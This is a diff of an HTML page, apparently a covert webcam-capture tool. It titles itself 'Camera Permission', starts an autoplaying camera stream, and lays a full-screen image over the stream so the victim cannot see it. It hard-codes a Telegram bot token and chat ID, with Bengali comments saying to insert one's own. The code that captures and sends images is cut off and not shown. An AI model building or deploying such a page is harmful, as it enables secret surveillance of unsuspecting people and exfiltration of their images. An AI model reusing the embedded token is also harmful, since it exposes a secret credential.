@@ -3,10 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>net</title>
+    <title>Camera Permission</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        #video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
+        }
+        #overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('your-image-url.jpg') no-repeat center center;
+            background-size: cover;
+            z-index: 2;
+        }
+    </style>
 </head>
 <body>
-      <video id="video" width="640" height="480"></video>
+    <h1>Camera Permission Example</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <div id="overlay"></div>
     <script>
         const botToken = '6279713413:AAEmPVpjxZROtRY9kjSysmSskrG3OrbuiWw'; // আপনার টেলিগ্রাম বট টোকেন এখানে দিন
         const chatId = '5125698617'; // আপনার চ্যাট আইডি এখানে দিন
